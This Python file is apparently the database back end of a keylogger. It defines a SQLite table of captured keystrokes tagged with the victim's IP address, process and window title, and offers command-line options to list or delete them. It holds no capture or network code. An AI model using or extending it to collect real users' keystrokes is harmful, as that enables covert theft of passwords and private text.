import sqlite3
from constants import DATABASE
import sys

def create_db(db_file):
    conn = None
    try:
        conn = sqlite3.connect(db_file)
    except Exception as e:
        print(e)
    return conn

def init_db(conn):
    keylogger_results_table = """CREATE TABLE IF NOT EXISTS keylogger_results (
                                 id integer PRIMARY KEY, 
                                 ip_address text NOT NULL, 
                                 executable_name text NOT NULL,
                                 process_id integer NOT NULL,
                                 window_title text NOT NULL,
                                 keys text NOT NULL
                                 );"""
    try:
        c = conn.cursor()
        c.execute(keylogger_results_table)
    except Exception as e:
        print(e)

def insert_keylog(conn, ip_addr, exec_name, process_id, window_title, keys):
    sql = """INSERT INTO keylogger_results(
                ip_address, 
                executable_name, 
                process_id, 
                window_title, 
                keys)
              VALUES(?, ?, ?, ?, ?)"""
    try:
        c = conn.cursor()
        c.execute(sql, (ip_addr, exec_name, process_id, window_title, keys))
        conn.commit()
        return c.lastrowid
    except Exception as e:
        print(e)

def get_keylogs(conn):
    try:
        c = conn.cursor()
        c.execute("SELECT * FROM keylogger_results")
        return c.fetchall()
    except Exception as e:
        print(e)

def delete_keylogs(conn):
    try:
        c = conn.cursor()
        deleted_rows_count = c.execute("DELETE FROM keylogger_results").rowcount
        conn.commit()
        return deleted_rows_count
    except Exception as e:
        print(e)

if __name__ == "__main__":
    if(len(sys.argv) != 2):
        print(f"""
        python {sys.argv[0]} --show-keylogs
        python {sys.argv[0]} --delete-keylogs
        """)
    else:
        conn = create_db(DATABASE)
        init_db(conn)
        if(sys.argv[1] == "--show-keylogs"):
            keylogs = get_keylogs(conn)
            for row in keylogs:
                kid, ip, exec_name, pid, window_title, keys = row
                print(f"{kid} - {ip} - {exec_name} - {pid} - {window_title} - {keys}")
        elif(sys.argv[1] == "--delete-keylogs"):
            delete_keylogs_count = delete_keylogs(conn)
            print(f"{delete_keylogs_count} rows have been removed")
        else:
            print("Unrecognized option.")
            print(f"""
            python {sys.argv[0]} --show-keylogs
            python {sys.argv[0]} --delete-keylogs
            """)
